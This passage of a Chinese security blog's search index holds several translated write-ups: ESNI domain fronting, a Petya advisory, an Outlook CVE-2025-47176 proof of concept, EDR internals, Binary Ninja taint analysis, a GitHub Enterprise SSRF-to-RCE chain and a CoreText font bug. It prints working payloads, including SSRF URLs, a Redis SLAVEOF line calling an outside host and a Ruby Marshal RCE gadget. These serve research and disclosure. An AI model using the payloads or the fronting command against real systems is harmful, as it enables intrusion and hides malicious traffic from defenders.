经过分析发现，Cloudflare在建立连接时会检查SNI(Server Name Indication)字段和Host头是否匹配。SNI在TLS握手过程中以明文形式发送，告知服务器应提供哪个证书。\n使用ESNI技术突破限制\rESNI(Encrypted SNI)作为TLS 1.3规范的一部分，可以加密SNI信息。虽然ESNI是新兴技术，但OpenSSL开发者Stephen Farrell已经实现了相关功能。\n以下是使用ESNI成功实现域名伪装的示例：\n1 2 3 4 5 6 $ export LD_LIBRARY_PATH=/home/robin/src/openssl $ ESNIRR=`dig +short txt _esni.www.cloudflare.com | sed -e \u0026#39;s/\u0026#34;//g\u0026#39;` $ (cat get_digininja.org;sleep 5) | /home/robin/src/openssl/apps/openssl s_client \\ -CApath /etc/ssl/certs/ -tls1_3 -connect www.cloudflare.com:443 -esni digininja.org.uk \\ -esnirr $ESNIRR -esni_strict -servername www.cloudflare.com 通过Wireshark抓包分析确认，ESNI扩展(0xFFCE)中的信息确实被加密，不再暴露真实域名。\n防御视角的启示\r对于防御者而言，如果仅依赖DNS查询和SNI主机名进行监控，这些信息已不再可信，因为它们完全处于攻击者控制之下。\n结论\r无论您称之为域名伪装、域名隐藏还是其他名称，本文展示了如何利用ESNI和自定义Host头将\u0026quot;恶意\u0026quot;HTTP请求隐藏在看似\u0026quot;良性\u0026quot;的请求中。由于ESNI受到隐私倡导者的支持，这项技术可能会长期有效。同时能够在监控系统日志中留下虚假标记也是一个额外优势。\n","date":"2025-08-03T01:39:57+08:00","permalink":"http://localhost:1313/p/%E9%80%9A%E8%BF%87cloudflare%E5%AE%9E%E7%8E%B0%E5%9F%9F%E5%90%8D%E4%BC%AA%E8%A3%85esni%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"通过Cloudflare实现域名伪装(ESNI技术解析)"},{"content":"Petya勒索软件攻击事件更新\r与近期WannaCrypt事件类似，我们再次遭遇名为Petya的勒索软件攻击。早期报告中存在大量相互矛盾的信息，包括对无关数据和误导性内容的混淆。微软团队迅速展开调查分析，使我们的恶意软件防护团队能够发布检测签名。\n攻击技术分析\r初始感染途径：恶意软件最初通过乌克兰公司M.E.doc财务软件的更新服务传播（该软件在乌克兰和俄罗斯广泛使用） 横向移动技术： 利用未修复的漏洞CVE-2017-0144和CVE-2017-0145进行网络传播（微软已于2017年3月发布修复补丁MS17-010） 当漏洞利用失效时，会采用凭证窃取、网络遍历等其他感染手段 防护方案\r紧急措施： 立即安装安全更新MS17-010 无法安装补丁的用户可禁用SMBv1（操作步骤见KB2696547） 增强防护： 实施网络分段和最小权限账户策略 Windows 10用户可使用Device Guard限制设备仅运行可信应用 部署Windows Defender高级威胁防护(ATP)自动检测勒索软件行为 微软将持续调查并采取必要措施保护客户安全。当前威胁形势表明，网络犯罪分子会不断调整攻击方式，需要同等级别的防御措施应对。\n技术资源：\n微软恶意软件防护中心分析报告 Windows 10创作者更新中的新一代勒索软件防护 Petya恶意软件百科条目 ","date":"2025-08-03T01:18:11+08:00","permalink":"http://localhost:1313/p/petya%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD/","title":"Petya勒索软件攻击事件技术分析与防护措施"},{"content":"Microsoft Outlook - 远程代码执行(RCE)\r作者: nu11secur1ty\r日期: 2025-07-08\r厂商: Microsoft\r软件: https://www.microsoft.com/en-us/microsoft-365/outlook/log-in\r参考:\rhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47176 \u0026gt; https://www.cloudflare.com/learning/security/what-is-remote-code-execution/\nCVE-2025-47176\r漏洞描述\r本概念验证(PoC)演示了CVE-2025-47176漏洞的模拟利用。它通过向Outlook注入特制邮件项，其中包含恶意同步路径，在扫描过程中触发特定操作。\n重要提示: 此PoC模拟了Outlook存在漏洞的路径解析功能，当检测到恶意路径时会触发系统重启。\n使用malicious.prf进行附加测试\r您也可以通过导入特制的Outlook配置文件(malicious.prf)来测试此PoC:\n将malicious.prf放在与PoC.py相同的目录下\n使用导入命令运行Outlook:\n1 \u0026amp; \u0026#34;C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\u0026#34; /importprf malicious.prf 使用方法\r确保Windows机器上已安装并配置Outlook 使用Python 3.x运行PoC脚本(需要pywin32包): 1 2 pip install pywin32 python PoC.py 脚本将执行以下操作: 注入带有恶意同步路径的邮件项 等待10秒让Outlook处理邮件 扫描收件箱和草稿文件夹 检测到恶意路径后，规范化路径并触发系统重启(shutdown /r /t 5) 警告\r此脚本在触发有效载荷后将在5秒后重启您的计算机 运行前请保存所有工作 仅在受控或虚拟化环境中测试 请勿在生产或重要系统上运行 文件说明\rPoC.py - Python概念验证脚本 许可声明\r本PoC仅用于教育和研究目的。\n请负责任且符合道德地使用。\n演示视频:\r链接\n源代码:\r链接\n","date":"2025-08-03T01:07:04+08:00","permalink":"http://localhost:1313/p/microsoft-outlook%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2025-47176%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"Microsoft Outlook远程代码执行漏洞(CVE-2025-47176)技术分析"},{"content":"Windows终端防御技术现状\r当今Windows桌面平台的终端防御生态已发展出高度成熟的能力体系。除传统杀毒软件外，扩展检测响应(XDR)技术和行为分析方法的结合，可全面覆盖初始访问阶段的恶意软件技术及入侵后活动检测。参与红队演练的专业人员普遍认为，如今通过二进制文件执行获取初始访问权限比以往任何时候都更加困难。即便成功入侵Windows平台，成熟防御环境对常见C2平台的入侵后活动也有完善的监测响应机制。\n这种强化的终端防御态势促使红队和威胁分子转向其他脆弱领域，包括云资源配置错误、团队协作工具漏洞、软件供应链攻击，以及各类IT解决方案中普遍存在的凭证管理问题。\n核心防御技术剖析\r本文重点探讨以下防御产品技术（含部分Windows原生功能集成）：\n静态文件分析\n高熵值文件（含大量加密数据）会触发多数产品的即时检测 Windows事件追踪(ETW)\n架构组成： 控制器：启停追踪会话 提供程序：生成事件数据 消费者：处理事件数据 提供三种提供程序类型：MOF、WPP和TraceLogging 可捕获近乎所有Windows API调用，形成数据洪流 Windows内核通知回调\n演进背景：微软通过Patch Guard禁止SSDT挂钩后提供的替代方案 关键回调类型： PsSetCreateProcessNotifyRoutine：进程创建事件 PsSetCreateThreadNotifyRoutine：线程创建事件 PsSetLoadImageNotifyRoutine：镜像加载事件 ObRegisterCallbacks：对象句柄操作 CmRegisterCallback：注册表操作 DLL API挂钩技术\n典型挂钩目标：ntdll.dll中的Native API 挂钩流程示例： 1 2 3 mov r10, rcx ; 保存RCX值 mov eax, \u0026lt;syscall\u0026gt; ; 设置系统调用号 test syscall_mode ; 检测调用约定 防御产品可通过JMP指令重定向API调用流 进程树分析\n通过父子进程关系识别异常行为（如Excel生成PowerShell子进程） 内存页扫描\n检测特征： 同时具备RWX权限的内存页 无镜像文件背书的可执行内存 Cobalt Strike等工具的已知内存模式 调用栈追踪\n利用线程栈帧分析非模块化代码执行 攻击者可伪造栈帧逃避检测 硬件强制栈保护（Win10/11）\n基于Intel CET/AMD影子栈技术 比较常规栈与影子栈的返回地址 有效防御ROP攻击 内核驱动阻止列表\n应对BYOVD（自带漏洞驱动）攻击 微软每半年更新官方阻止列表 现存漏洞驱动资源：loldrivers.io 攻防演进趋势\r现代Windows终端的高强度防御使得在成熟环境中建立持久据点变得极具挑战性。成功的初始访问操作越来越依赖精密的攻击工件生成技术，这需要采用进攻性DevOps方法（将在本系列第二部分详述）。\n特别预告：2月29日EST下午1点将举办专题研讨会《Windows下Python psutil模块深度解析》\n","date":"2025-08-03T00:55:43+08:00","permalink":"http://localhost:1313/p/windows%E7%BB%88%E7%AB%AF%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF%E5%85%A8%E6%99%AF%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/","title":"Windows终端防御技术全景：初始访问攻防实战（第一部分）"},{"content":"反向污点分析原理\r在Trail of Bits暑期实习期间，我开发了KRFAnalysis工具集，用于分析系统调用故障注入工具KRF产生的崩溃。KRF能有效引发程序崩溃，但难以确定具体是哪个故障系统调用导致了崩溃。\n人工分析示例\r以一个存在漏洞的程序为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;stdlib.h\u0026gt; void fillBuffer(char *string, unsigned len) { for (unsigned i = 0; i \u0026lt; len; ++i) { string[i] = \u0026#39;A\u0026#39;; // 如果string为NULL会导致段错误 } } int main() { char *str; str = (char *) malloc(16); fillBuffer(str, 16); // 未检查malloc是否失败 free(str); return 0; } 通过gdb分析核心转储：\n1 2 3 (gdb) bt #0 0x00005555555546a8 in fillBuffer() #1 0x00005555555546e1 in main() 逆向分析显示malloc的返回值未经检查就直接传递给fillBuffer，导致写入NULL指针时崩溃。\nMLIL SSA形式分析\rBinary Ninja的Medium Level IL(MLIL)转换为Static Single Assignment(SSA)形式后，变量追踪变得简单：\n每个变量只被赋值一次 函数参数和返回值关系清晰可见 通过vars_read和get_ssa_var_definition方法可自动追踪数据流 自动化分析算法\r创建空栈 将崩溃指令压入栈 当栈不为空时： 弹出指令 如果是函数调用：标记返回值可能为崩溃原因 否则：追踪所有SSA变量的定义 Python实现\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 def checkFunction(self, inst_addr, bv): func = bv.get_functions_containing(inst_addr)[0].medium_level_il inst = func[func.get_instruction_start(inst_addr)].ssa_form func = func.ssa_form visited_instructions = set() var_stack = [] for v in inst.vars_read: var_stack.append(v) while len(var_stack) \u0026gt; 0: var = var_stack.pop() if var not in visited_instructions: visited_instructions.add(var) decl = func.get_ssa_var_definition(var) if decl is None: print(\u0026#34;Argument \u0026#34; + var.var.name + \u0026#34; tainted from function call\u0026#34;) continue if decl.operation == MediumLevelILOperation.MLIL_CALL_SSA: if decl.dest.value.is_constant: func_called = bv.get_function_at(decl.dest.value.value) print(\u0026#34;Tainted by call to\u0026#34;, func_called.name, \u0026#34;(\u0026#34; + hex(decl.dest.value.value) + \u0026#34;)\u0026#34;) else: print(\u0026#34;Tainted by indirect call at instruction\u0026#34;, hex(decl.address)) continue for v in decl.vars_read: var_stack.append(v) 工具集扩展\r完整的KRFAnalysis包含三个组件：\nmain.py - 从核心转储提取信息并打包 analyze.py - 自动运行反向污点分析 krf.py - 核心分析逻辑（基于Binary Ninja API） 使用示例：\n1 2 3 4 5 # 在KRF虚拟机 python3 main.py binary core # 在Binary Ninja环境 python3 analyze.py analysis_package.tar.gz 结论\rBinary Ninja API提供了强大的二进制分析能力，其SSA形式的中间语言显著简化了逆向分析过程。虽然LLVM框架在源码分析方面有优势，但Binary Ninja可以直接处理二进制文件，使其成为无源码情况下的理想选择。\n工具集已开源，包含三个LLVM静态分析pass：\n检测竞态条件(TOCTOU) 检测未检查的标准库调用错误 反向污点分析的LLVM实现 ","date":"2025-08-03T00:44:21+08:00","permalink":"http://localhost:1313/p/%E4%BD%BF%E7%94%A8binary-ninja%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%90%91%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90-%E8%BF%BD%E8%B8%AA%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83%E6%A0%B9%E6%BA%90/","title":"使用Binary Ninja进行反向污点分析 - 追踪程序崩溃根源"},{"content":"GitHub Enterprise漏洞链：从SSRF到RCE的四个漏洞利用\r大家好，我是Orange。距离我上次写博客已经有一段时间了。\n在过去的几个月里，我花了很多时间准备Black Hat USA 2017和DEF CON 25的演讲。成为Black Hat和DEFCON的演讲者一直是我的人生目标之一。这也是我在如此正式的会议上第一次用英语演讲，真是一次难忘的经历:P\n感谢评审委员会的认可。\n这篇文章是我演讲中的一个简单案例研究。这里的技术并不新鲜，但我会向你展示这些老技巧有多么强大！如果你感兴趣，可以在这里查看幻灯片：\n《SSRF的新时代 - 利用流行编程语言中的URL解析器！》\n幻灯片涵盖了更强大的SSRF新方法以及本文未包含的其他技术。\n在本文中，我将向你展示一个漂亮的漏洞利用链，它将4个漏洞串联起来，最终在GitHub Enterprise上实现了远程代码执行(RCE)。这个漏洞还获得了GitHub第三届漏洞赏金周年促销活动的\u0026quot;最佳报告\u0026quot;奖励！\n前言\r在我上一篇博客文章中，我提到了新目标 - GitHub Enterprise，并演示了如何反混淆Ruby代码并在其上找到SQL注入。之后，我看到几位漏洞赏金猎人开始关注GitHub Enterprise，并发现了许多惊人的漏洞，比如：\nilektrojohn的《通往你代码库的道路铺满了伪造的断言》 iblue的《GitHub Enterprise远程代码执行》 看到这些文章后，我有点沮丧，责怪自己为什么没有注意到这些。\n因此，我下定决心要找到一个别人没有发现的关键漏洞。当然，是用我自己的方式！\n漏洞\r在检查GitHub Enterprise的架构之前，我的直觉告诉我，GitHub Enterprise内部有许多服务。如果我能与它们互动，我相信我能发现一些有趣的东西。\n所以，我专注于寻找服务器端请求伪造(SSRF)漏洞。\n第一个漏洞 - 无害的SSRF\r在使用GitHub Enterprise时，我注意到一个有趣的功能叫做WebHook。它可以在特定的GIT命令发生时定义一个自定义的HTTP回调。\n你可以从以下URL创建一个HTTP回调：\n1 https://\u0026lt;host\u0026gt;/\u0026lt;user\u0026gt;/\u0026lt;repo\u0026gt;/settings/hooks/new 并通过提交文件来触发它。GitHub Enterprise会通过HTTP请求通知你。有效载荷和请求如下：\n有效载荷URL：\n1 http://orange.tw/foo.php 回调请求：\n1 2 3 4 5 6 7 8 9 10 POST /foo.php HTTP/1.1 Host: orange.tw Accept: */* User-Agent: GitHub-Hookshot/54651ac X-GitHub-Event: ping X-GitHub-Delivery: f4c41980-e17e-11e6-8a10-c8158631728f content-type: application/x-www-form-urlencoded Content-Length: 8972 payload=... GitHub Enterprise使用Ruby Gem faraday来获取外部资源，并通过Gem faraday-restrict-ip-addresses防止用户请求内部服务。\n这个Gem似乎只是一个黑名单，可以通过RFC 3986中定义的罕见IP地址格式轻松绕过。在Linux中，0代表localhost。\nPoC：\n1 http://0/ 好了，我们现在有一个SSRF了。然而，我们仍然不能做任何事情。为什么？\n这个SSRF有几个限制：\n仅支持POST方法 仅允许HTTP和HTTPS方案 不支持302重定向 在faraday中无法进行CR-LF注入 无法控制POST数据和HTTP头 唯一可以控制的是路径部分。\n但是，值得一提的是，这个SSRF可以导致拒绝服务(DoS)。\n有一个Elasticsearch服务绑定在端口9200上。在shutdown命令中，Elasticsearch不关心POST数据是什么。因此，你可以玩它的REST-ful API来取乐:P\n拒绝服务PoC：\n1 http://0:9200/_shutdown/ 第二个漏洞 - 内部Graphite中的SSRF\r我们现在有一个SSRF，但有很多限制。我能做什么？ 我的下一个想法是 - 有没有我们可以利用的内网服务？\n这是一项大工程。内部有几个HTTP服务，每个服务基于不同的语言实现，如C/C++、Go、Python和Ruby\u0026hellip;\n经过几天的挖掘，我发现有一个叫做Graphite的服务运行在端口8000上。Graphite是一个高度可扩展的实时图形系统，GitHub使用这个系统向用户显示一些统计数据。\nGraphite是用Python编写的，也是一个开源项目，你可以在这里下载源代码！\n通过阅读源代码，我很快在这里发现了另一个SSRF。第二个SSRF很简单。\n在文件webapps/graphite/composer/views.py中：\n1 2 3 4 5 6 7 8 9 10 def send_email(request): try: recipients = request.GET[\u0026#39;to\u0026#39;].split(\u0026#39;,\u0026#39;) url = request.GET[\u0026#39;url\u0026#39;] proto, server, path, query, frag = urlsplit(url) if query: path += \u0026#39;?\u0026#39; + query conn = HTTPConnection(server) conn.request(\u0026#39;GET\u0026#39;,path) resp = conn.getresponse() ... 你可以看到Graphite接收用户输入的url并直接获取它！所以，我们可以使用第一个SSRF来触发第二个SSRF，并将它们组合成一个SSRF执行链。\nSSRF执行链有效载荷：\n1 2 3 http://0:8000/composer/send_email? to=orange@nogg\u0026amp; url=http://orange.tw:12345/foo 第二个SSRF的请求：\n1 2 3 4 5 6 $ nc -vvlp 12345 ... GET /foo HTTP/1.1 Host: orange.tw:12345 Accept-Encoding: identity 好了，我们成功地将基于POST的SSRF变成了基于GET的SSRF。但仍然不能做任何事情。\n让我们进入下一阶段！\n第三个漏洞 - Python中的CR-LF注入\r如你所见，Graphite使用Python的httplib.HTTPConnection来获取资源。经过一些尝试和错误，我注意到httplib.HTTPConnection中存在CR-LF注入。因此，我们可以在HTTP协议中嵌入恶意负载。\nCR-LF注入PoC：\n1 2 3 http://0:8000/composer/send_email? to=orange@nogg\u0026amp; url=http://127.0.0.1:12345/%0D%0Ai_am_payload%0D%0AFoo: 1 2 3 4 5 6 7 8 $ nc -vvlp 12345 ... GET / i_am_payload Foo: HTTP/1.1 Host: 127.0.0.1:12345 Accept-Encoding: identity 这是一小步，但对整个漏洞利用链来说是一个巨大的飞跃。现在，我可以在这个SSRF执行链中走私其他协议。例如，如果我们想玩Redis，可以尝试以下有效载荷：\n1 2 3 http://0:8000/composer/send_email? to=orange@nogg\u0026amp; url=http://127.0.0.1:6379/%0ASLAVEOF%20orange.tw%206379%0A 注意：SLAVEOF是一个非常棒的命令，可以让你产生出站流量。当面对一些盲SSRF时，这是一个有用的技巧！\n看起来很棒！然而，协议走私也有一些限制：\n需要握手的协议如SSH、MySQL和SSL会失败 由于Python2的限制，我们在第二个SSRF中使用的有效载荷只允许0x00到0x8F的字节 顺便说一下，在HTTP方案中走私协议的方法不止一种。在我的幻灯片中，我还展示了如何利用Linux Glibc的特性通过SSL SNI走私协议，以及一个绕过Python CVE-2016-5699的案例研究！\n如果你感兴趣，可以查看一下 :)\n第四个漏洞 - 不安全的反序列化\r现在，我们有了在HTTP协议中走私其他协议的能力，但下一个问题是，我选择走私什么协议？\n我花了很多时间研究如果我能控制Redis或Memcached，可以触发什么漏洞。\n在审查源代码时，我很好奇为什么GitHub可以在Memcached中存储Ruby对象。经过一些挖掘，我发现GitHub Enterprise使用Ruby Gem memcached来处理缓存，并且缓存是用Marshal包装的。\n这对我来说是个好消息。每个人都知道Marshal是危险的。\n（如果你不知道，我推荐你阅读@frohoff和@gebl在AppSec California 2015上的幻灯片《Marshalling Pickles》）\n所以，我们的目标很明确。\n我们使用SSRF执行链在Memcached中存储恶意的Ruby对象。下次GitHub获取缓存时，Ruby Gem memcached会自动反序列化数据。结果是\u0026hellip; BOOM！远程代码执行！XD\nRails控制台中的不安全Marshal：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 irb(main):001:0\u0026gt; GitHub.cache.class.superclass =\u0026gt; Memcached::Rails irb(main):002:0\u0026gt; GitHub.cache.set(\u0026#34;nogg\u0026#34;, \u0026#34;hihihi\u0026#34;) =\u0026gt; true irb(main):003:0\u0026gt; GitHub.cache.get(\u0026#34;nogg\u0026#34;) =\u0026gt; \u0026#34;hihihi\u0026#34; irb(main):004:0\u0026gt; GitHub.cache.get(\u0026#34;nogg\u0026#34;, :raw=\u0026gt;true) =\u0026gt; \u0026#34;\\x04\\bI\\\u0026#34;\\vhihihi\\x06:\\x06ET\u0026#34; irb(main):005:0\u0026gt; code = \u0026#34;`id`\u0026#34; =\u0026gt; \u0026#34;`id`\u0026#34; irb(main):006:0\u0026gt; payload = \u0026#34;\\x04\\x08\u0026#34; + \u0026#34;o\u0026#34;+\u0026#34;:\\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\u0026#34;+\u0026#34;\\x07\u0026#34; + \u0026#34;:\\x0E@instance\u0026#34; + \u0026#34;o\u0026#34;+\u0026#34;:\\x08ERB\u0026#34;+\u0026#34;\\x07\u0026#34; + \u0026#34;:\\x09@src\u0026#34; + Marshal.dump(code)[2..-1] + \u0026#34;:\\x0c@lineno\u0026#34;+ \u0026#34;i\\x00\u0026#34; + \u0026#34;:\\x0C@method\u0026#34;+\u0026#34;:\\x0Bresult\u0026#34; =\u0026gt; \u0026#34;\\u0004\\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\\a:\\u000E@instanceo:\\bERB\\a:\\t@srcI\\\u0026#34;\\t`id`\\u0006:\\u0006ET:\\f@linenoi\\u0000:\\f@method:\\vresult\u0026#34; irb(main):007:0\u0026gt; GitHub.cache.set(\u0026#34;nogg\u0026#34;, payload, 60, :raw=\u0026gt;true) =\u0026gt; true irb(main):008:0\u0026gt; GitHub.cache.get(\u0026#34;nogg\u0026#34;) =\u0026gt; \u0026#34;uid=0(root) gid=0(root) groups=0(root)\\n\u0026#34; 好了，让我们总结一下我们的步骤！\n第一个SSRF - 绕过Webhook中的现有保护 第二个SSRF - Graphite服务中的SSRF 将第一个SSRF和第二个SSRF串联成SSRF执行链 SSRF执行链中的CR-LF注入 作为Memcached协议走私并插入恶意的Marshal对象 触发RCE 漏洞利用概览\r最终的漏洞利用可以在Gist上找到，视频可以在Youtube上观看。\n修复\rGitHub已经做了许多改进来防止相关问题再次发生！\n增强了Gem faraday-restrict-ip-addresses 应用了自定义的Django中间件，确保攻击者无法访问http://127.0.0.1:8000/render/之外的路径 增强了iptables规则，阻止带有User-Agent: GitHub-Hookshot模式的访问 1 2 3 4 $ cat /etc/ufw/before.rules ... -A ufw-before-input -m multiport -p tcp ! --dports 22,23,80,81,122,123,443,444,8080,8081,8443,8444 -m recent --tcp-flags PSH,ACK PSH,ACK --remove -m string --algo bm --string \u0026#34;User-Agent: GitHub-Hookshot\u0026#34; -j REJECT --reject-with tcp-reset ... 时间线\r2017/01/23 23:22 通过HackerOne向GitHub报告漏洞，分配报告编号200542 2017/01/23 23:37 GitHub将状态更改为Triaged。 2017/01/24 04:43 GitHub回应问题已验证并正在修复。 2017/01/31 14:01 发布GitHub Enterprise 2.8.7。 2017/02/01 01:02 GitHub回应此问题已修复！ 2017/02/01 01:02 GitHub奖励7,500美元赏金！ 2017/03/15 02:38 GitHub奖励5,000美元最佳报告奖金。 ","date":"2025-08-03T00:32:56+08:00","permalink":"http://localhost:1313/p/github-enterprise%E6%BC%8F%E6%B4%9E%E9%93%BE%E4%BB%8Essrf%E5%88%B0rce%E7%9A%84%E5%9B%9B%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","title":"GitHub Enterprise漏洞链：从SSRF到RCE的四个漏洞利用"},{"content":"以Buttercup开启AIxCC决赛征程\rDARPA人工智能网络挑战赛（AIxCC）决赛正式启动，我们的网络推理系统Buttercup已整装待发！这项最初限制严格的赛事现已变得更加雄心勃勃。参赛团队现在可以构建自定义AI模型、自主控制基础设施，并同时应对多种类型的安全挑战。伴随新挑战而来的是更多资源——每项挑战的预算从半决赛的100美元提升至1000美元以上。\n这些改变不仅是数字上的增长，更是让参赛者能够构建更接近实用安全工具的系统，而非学术概念验证。技术方法的弹性扩展也意味着我们将看到AI在网络安全问题上更创新的应用——这些在半决赛限制下根本无法实现。\n预算与时间扩展\r决赛最显著的改变是每支团队可用资源的大幅增加。半决赛中，参赛系统在严格限制下运行：\n时间：每项挑战仅4小时分析时间 AI预算：每项挑战仅100美元用于商业AI API调用（如ChatGPT、Claude） 计算预算：固定分配的虚拟机资源，扩展选项有限 决赛阶段的约束条件（可能调整）现已变为：\n时间：每项挑战8+小时 AI预算：每轮10,000美元用于商业AI API调用（每轮含多项挑战） 计算预算：每轮20,000美元用于Azure资源（服务器、VM、GPU） 这些新增资源让我们能在更实际的时间框架内进行更彻底的分析。Buttercup现在能够：\n执行更深入的动态分析并对补丁进行更全面的测试 扩展资源密集型任务（如模糊测试）的规模 使用更多样化的商业AI模型处理更广泛的任务 多轮竞赛机制\r与半决赛单轮评分不同，决赛包含三轮不计分的展示赛，让团队能在最终评分轮前迭代改进其CRS系统：\n轮次 开放时间 计分 关键参数 展示赛1 4月1日 不计分 2万计算预算+1万AI预算，2项挑战，最多2项并发，48小时窗口（仅差异扫描挑战） 展示赛2 5月6日 不计分 同预算，15-30项挑战，最多4项并发，8小时差异扫描/24小时全扫描窗口 展示赛3 6月3日 不计分 参数待定（提前30天公布） 决赛轮 6月24日 计分 参数待定（提前30天公布） 表1：决赛阶段竞赛结构\n这种渐进式设计鼓励系统适应变化的需求——这是现实世界安全工具的关键品质。参赛者还能基于前几轮反馈迭代优化方案，使DEFCON 2025亮相的最终系统更加健壮。\n多样化挑战类型\r最具技术意义的变革是引入多种挑战类型。半决赛仅有一种挑战模式——提供少于100次提交的精简git历史的真实开源软件。决赛挑战仍基于真实开源软件，但现包含：\n差异扫描挑战\n提供代码库和引入漏洞的单个diff文件。代码库包含初始模糊测试工具，diff文件则为CRS提供识别和修补漏洞的额外起点。\n全扫描挑战\n呈现已包含漏洞的扁平化代码库。没有diff文件作为起点，CRS必须仅依靠模糊测试工具对代码库进行全面分析。\nSARIF广播挑战\n提供SARIF格式的静态分析警报（可能为真阳性或假阳性）。CRS需评估警报是否代表真实漏洞，并可选择提供补丁。\n这种多样化至关重要，因为现实漏洞可能通过代码审查、静态分析工具、模糊测试和运行时监控等多种渠道发现。能处理所有这些输入的系统在实际安全环境中将更具价值。\n支持自定义AI模型开发\r这项赛事政策的最大变革是DARPA现在允许使用自定义AI/ML模型。半决赛中系统仅能使用Anthropic、OpenAI和Google的第三方模型。现在参赛者可开发部署自己的专用模型（需通过竞赛审核且可复现）。\n团队现在能够：\n微调专门用于安全漏洞检测的模型 为漏洞分析的不同环节创建专用模型 开发轻量级高效模型处理重复性任务 为确保公平竞争仍有限制：自定义模型不能预训练记忆开源软件历史漏洞信息。这防止团队简单教授模型已知问题，确保系统展示真正的推理能力。\n弹性计算资源配置\r另一重大技术转变是赋予参赛者基础设施的直接控制权。团队现在获得Azure订阅，仅受轮次计算预算约束，而非半决赛的固定计算资源分配。\n这意味着团队能基于每项挑战的独特需求制定资源分配策略：\n为计算密集型模糊测试分配更强硬件 为运行自定义AI模型配置昂贵GPU实例 根据挑战复杂度动态扩展资源 并行运行多个分析管道 这种弹性让团队能在不计分轮次试验不同分配策略，确定哪种方案最适合各类挑战。\n评分算法革新\rAIxCC决赛保留\u0026quot;补丁价值远高于单纯漏洞发现\u0026quot;的核心评分原则，但新增维度：\n新增得分机会：\nSARIF分类：正确标记静态分析警报的真/假阳性 捆绑提交：将SARIF广播与漏洞和补丁关联 新评分修正项：\n早鸟奖励：越早提交得分越高 跨团队验证：补丁必须能抵御所有团队发现的崩溃输入才能得分 这些改变激励团队构建能快速通过不同方法发现漏洞的系统，并创建真正解决漏洞根源而非过滤特定崩溃输入的补丁。\nButtercup的下一步\rButtercup 2.0正在参与展示赛，团队利用反馈优化方案。我们的工作将在6月下旬的决赛轮达到高潮，结果于8月DEF CON 2025公布。这项赛事诞生的系统将代表自动化漏洞发现与修复领域的重大飞跃。\n敬请关注Buttercup在AIxCC决赛中的更多进展！\n免责声明：本文涉及的AIxCC规则、评分指南、基础设施和活动信息可能变更。本文非权威文档，请以DARPA官网和官方文件为准。\n","date":"2025-08-03T00:20:05+08:00","permalink":"http://localhost:1313/p/aixcc%E5%86%B3%E8%B5%9B%E5%90%AF%E5%8A%A8buttercup%E5%BC%95%E9%A2%86%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8ai%E6%96%B0%E6%B5%AA%E6%BD%AE/","title":"AIxCC决赛启动：Buttercup引领网络安全AI新浪潮"},{"content":"CVE-2021-1758（CoreText越界读取）分析\rMac资源派生字体文件\r资源派生结构\r现代macOS系统可以加载称为Mac资源派生（Resource Fork）的字体文件。这种遗留结构包含：\n资源头（16字节）：记录数据偏移/大小 资源数据：多个资源条目（4字节长度+可变数据） 资源映射表：包含类型列表、引用列表和名称列表 关键数据结构\r1 2 3 4 # 示例资源头结构 res_header = p32(data_offset) + p32(map_offset) + p32(data_len) + p32(map_len) # 资源类型列表项 type_entry = b\u0026#34;FOND\u0026#34; + p16(res_count-1) + p16(ref_list_offset) 目标分析\r测试环境搭建\r使用CoreText框架的测试工具：\n1 CFArrayRef descriptors = CTFontManagerCreateFontDescriptorsFromURL(url); 覆盖率分析\r通过TinyInst获取执行路径：\n1 sudo litecov -instrument_module libFontParser.dylib -- ./main font.dfont Arial字体：719个基本块 自定义字体：557-629个基本块（逐步修正结构后） 漏洞细节\r触发路径\r绕过CheckMapHeaderCommon的字节序检查： 1 res_map_offset = _byteswap_ulong(header[1]); // 需大端序 操纵资源类型数量使CheckMapCommon提前返回： 1 if(num_types \u0026lt;= 0) return 0; // 通过设置0xFFFF触发 在GetResourcePtrCommon中触发OOB读取： 1 memmove(dst, res_name_entry, name_len+1); // 未验证的偏移量 PoC构造\r1 2 3 4 5 # 关键恶意结构 res_map += p16(0xffff) # 欺骗类型检查 res_map += p16(0x6000) # 可控的OOB偏移 with open(\u0026#34;exp.dfont\u0026#34;,\u0026#34;wb\u0026#34;) as f: f.write(pad(24)+res_data+res_map) 参考\rSTAR Labs安全公告STAR-21-1758 macOS 10.15.4 (19E287)验证受影响 字体解析器未正确处理资源映射表验证 ","date":"2025-08-03T00:08:04+08:00","permalink":"http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90cve-2021-1758coretext%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","title":"深入解析CVE-2021-1758（CoreText越界读取漏洞）"},{"content":"Pwn2Own: Safari沙箱逃逸第一部分 - 获取root 